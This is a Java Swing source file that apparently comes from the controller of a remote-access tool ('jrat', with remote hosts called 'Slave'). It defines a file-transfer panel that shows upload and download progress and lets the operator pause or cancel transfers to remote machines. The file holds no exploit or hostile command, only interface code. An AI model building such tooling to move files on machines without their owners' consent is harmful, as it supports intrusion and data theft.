package jrat.controller.ui.panels;

import iconlib.FileIconUtils;
import jrat.api.Resources;
import jrat.common.io.FileCache;
import jrat.common.io.TransferData;
import jrat.common.io.TransferData.State;
import jrat.common.utils.DataUnits;
import jrat.common.utils.MathUtils;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet102PauseServerUpload;
import jrat.controller.packets.outgoing.Packet103CompleteServerUpload;
import jrat.controller.packets.outgoing.Packet105CancelServerDownload;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.DefaultJTableCellRenderer;
import jrat.controller.ui.components.TableModel;
import jrat.controller.utils.Utils;

import javax.swing.*;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.List;


@SuppressWarnings("serial")
public class PanelFileTransfers extends JPanel {

	public static PanelFileTransfers instance;
	
	static {
		instance = new PanelFileTransfers();
	}

	private JTable table;
    private TableModel model;

	private JMenuItem btnPause;

	public PanelFileTransfers() {
		setLayout(new BorderLayout(0, 0));

        JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);


		table = new DefaultJTable();
		
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "File Path", "Status", "Progress", "%", "Time Left" }) {
			public boolean isCellEditable(int row, int column) {
				return false;
			}
		});

		table.setDefaultRenderer(Object.class, new FileTransferTableRenderer());

		table.getTableHeader().setReorderingAllowed(false);
		table.setRowHeight(25);
		scrollPane.setViewportView(table);
		
		add(scrollPane, BorderLayout.CENTER);
		
		JPopupMenu menu = new JPopupMenu();
		
		btnPause = new JMenuItem("Pause");
		btnPause.setIcon(Resources.getIcon("pause"));
		btnPause.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				int[] rows = table.getSelectedRows();
				
				for (int i : rows) {
					TransferData d = (TransferData) table.getValueAt(i, 0);
					
					if (d.getState() == State.PAUSED || d.getState() == State.IN_PROGRESS) {
						if (d.getState() == State.PAUSED) {
							d.setState(State.IN_PROGRESS);
						} else {
							d.setState(State.PAUSED);
						}
						
						if (d.isUpload()) {
							d.getRunnable().pause(); 
						} else {					
							((Slave)d.getObject()).addToSendQueue(new Packet102PauseServerUpload(d.getRemoteFile()));
						}
					}
				}
			}
		});
		
		menu.add(btnPause);

        JMenuItem btnCancel = new JMenuItem("Cancel");
		btnCancel.setIcon(Resources.getIcon("delete"));
		btnCancel.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				int[] rows = table.getSelectedRows();
				
				for (int i : rows) {
					TransferData d = (TransferData) table.getValueAt(i, 0);
					
					if (d.getState() != State.ERROR && d.getState() != State.COMPLETED) {
						d.setState(State.ERROR);
						
						if (d.isUpload()) {
							d.getRunnable().interrupt();
							((Slave)d.getObject()).addToSendQueue(new Packet103CompleteServerUpload(d.getRemoteFile()));
						} else {
                            FileCache.remove(d.getLocalFile().getAbsolutePath());
							((Slave)d.getObject()).addToSendQueue(new Packet105CancelServerDownload(d.getRemoteFile()));
						}
					}
				}
			}
		});
		
		menu.add(btnCancel);
		
		menu.addPopupMenuListener(new PopupMenuListener() {
			@Override
			public void popupMenuCanceled(PopupMenuEvent e) {
				
			}

			@Override
			public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
				
			}

			@Override
			public void popupMenuWillBecomeVisible(PopupMenuEvent e) {
				TransferData[] selected = getSelectedItems();
				
				if (selected.length == 1) {
					if (selected[0].getState() == State.PAUSED) {
						btnPause.setIcon(Resources.getIcon("start"));
						btnPause.setText("Continue");
					} else {
						btnPause.setIcon(Resources.getIcon("pause"));
						btnPause.setText("Pause");
					}
					
					btnPause.setEnabled(selected[0].getState() != State.COMPLETED && selected[0].getState() != State.ERROR);
				} else {
					btnPause.setEnabled(false);
					btnPause.setIcon(Resources.getIcon("pause"));
					btnPause.setText("Pause");
				}
			}
		});
		
		Utils.addPopup(table, menu);
	}
	
	public TransferData[] getSelectedItems() {
		int[] rows = table.getSelectedRows();
		
		TransferData[] td = new TransferData[rows.length];
		
		for (int i = 0; i < rows.length; i++) {
			int row = rows[i];
			td[i] = (TransferData) table.getValueAt(row, 0);
		}
		
		return td;
	}
	
	public void add(TransferData data) {
	    data.setState(State.IN_PROGRESS);
		model.insertRow(0, new Object[] { data });
	}

	public void remove(TransferData data) {
		for (int i = 0; i < table.getRowCount(); i++) {
			if (table.getValueAt(i, 0) == data) {
				model.removeRow(i);
				break;
			}
		}
	}

	public List<TransferData> getTransfers() {
		List<TransferData> list = new ArrayList<>();
		
		for (int i = 0; i < model.getRowCount(); i++) {
			list.add((TransferData) table.getValueAt(i, 0));
		}
		
		return list;
	}
	
	public class FileTransferTableRenderer extends DefaultJTableCellRenderer {

		public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
			super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);

			TransferData data = (TransferData) table.getValueAt(row, 0);		
			
			if (column == 0) {
				setText(data.getRemoteFile());
				setIcon(FileIconUtils.getIconFromExtension(data.getRemoteFile()));
			} else {
				setIcon(null);
			}
			
			if (column == 1) {
				if (data.getState() == State.ERROR) {
					setIcon(Resources.getIcon("error"));
					setForeground(Color.red);
					setText("Terminated");
				} else if (data.getState() == State.IN_PROGRESS) {
					if (data.isUpload()) {
						setIcon(Resources.getIcon("arrow-up"));
					} else {
						setIcon(Resources.getIcon("arrow-down"));
					}
					setForeground(Color.black);
					if (data.isUpload()) {
						setText("Uploading");
					} else {
						setText("Downloading");
					}
				} else if (data.getState() == State.PAUSED) {
					setIcon(Resources.getIcon("pause"));
					setText("Paused");
				} else if (data.getState() == State.COMPLETED) {
					setIcon(Resources.getIcon("tick"));
					setForeground(Color.green.darker());
					setText("Completed");
				} else if (isSelected) {
					setIcon(null);
					setText("");
					setForeground(Color.black);
				}
			}
			
			if (column == 2) {
				setText(DataUnits.getAsString(data.getRead()) + "/" + DataUnits.getAsString(data.getTotal()) + " @ " + DataUnits.getAsString(data.getSpeed()) + "/s ");
			}
			
			if (column == 3) {
				Color color;
				
				if (data.getState() == State.ERROR) {
					color = Color.red;
				} else if (data.getState() == State.PAUSED) {
					color = Color.yellow;
				} else {
					color = Color.green.darker();
				}
				
				JProgressBar bar = new JProgressBar();
				bar.setMaximum((int) data.getTotal());
				bar.setValue(data.getRead());
				bar.setStringPainted(true);
				bar.setForeground(color);
				return bar;
			}
			
			if (column == 4) {
				 if (data.getSpeed() > 0) {
					 setText(MathUtils.getRemainingTime(data.getSpeed(), data.getWhatsLeft()) + " remaining");
				 } else {
					 setText("");
				 }
			}

			return this;
		}
	}

	public void update() {
		table.repaint();
	}
}
